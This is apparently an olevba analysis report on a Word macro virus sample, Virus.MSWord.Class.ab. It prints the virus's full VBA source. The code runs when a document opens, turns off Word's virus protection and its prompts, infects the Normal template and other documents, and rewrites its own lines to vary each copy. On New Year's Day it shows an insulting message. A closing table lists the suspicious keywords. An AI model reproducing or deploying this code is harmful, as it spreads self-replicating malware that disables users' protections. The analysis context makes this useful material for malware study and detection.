olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab-944b28c8161a4cca27923536852bd557fbffe9f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab-944b28c8161a4cca27923536852bd557fbffe9f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
HQ47 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.VirusProtection = 0
OFG = SSM + VUE
BR34 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PVF = LCV + OAM
Options.ConfirmConversions = 0
CCR = GBG + IGU
Options.SaveNormalPrompt = 0
VIG = DDO + JJP
Application.EnableCancelKey = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set UD52 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
JQ17 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set UD52 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
FM91 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If FM91 <> True And JQ17 <> True Then GoTo UP10
HCM = DUC + JGT
If FM91 = True Then UD52.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HQ47 - 1))
QGO = FBA + HRG
If JQ17 = True Then UD52.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BR34 - 1))
FKF = HAK + ETM
With UD52.CodeModule
QUH = LBN + JVC
For x = 2 To (UD52.CodeModule.CountOfLines - 1) Step 2
UNH = DKE + VCA
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
HMU = LIS + SOP
Next x
VHK = JPD + JLR
End With
LJL = FNK + OTI
If Month(Now) = 1 And Day(Now) = 1 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!"
GGD = LEM + HTK
UP10:
EPQ = NRD + REV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

